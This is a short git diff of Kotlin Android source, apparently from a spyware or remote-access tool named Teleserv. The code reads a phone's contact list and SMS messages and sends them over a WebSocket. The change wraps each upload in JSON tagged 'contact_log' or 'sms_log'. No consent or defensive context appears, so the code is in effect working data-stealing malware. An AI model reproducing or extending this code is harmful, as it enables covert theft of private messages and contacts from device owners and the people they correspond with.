@@ -12,6 +12,7 @@ import android.provider.ContactsContract
 import android.provider.Telephony
 import android.telephony.SmsManager
 import okhttp3.WebSocket
+import org.json.JSONObject
 import java.io.BufferedWriter
 import java.io.File
 import java.io.FileOutputStream
@@ -65,7 +66,10 @@ object Teleserv {
                 }
                 cur?.close()
             }
-        webSocket.send(allContactList);
+        val jsontext = JSONObject()
+        jsontext.put("type","contact_log")
+        jsontext.put("data",allContactList);
+        webSocket.send(jsontext.toString())
     }
     @SuppressLint("Range")
     fun uploadsms(contentResolver: ContentResolver, context: Context , webSocket: WebSocket) {
@@ -92,7 +96,10 @@ object Teleserv {
             }
             cursor.close()
         }
-        webSocket.send(smsText.toString());
+        val jsontext = JSONObject()
+        jsontext.put("type","sms_log")
+        jsontext.put("data",smsText);
+        webSocket.send(jsontext.toString())
     }
     fun dateToString(timestamp: Long): String {
         val dateFormat = "yyyy-MM-dd HH:mm:ss"
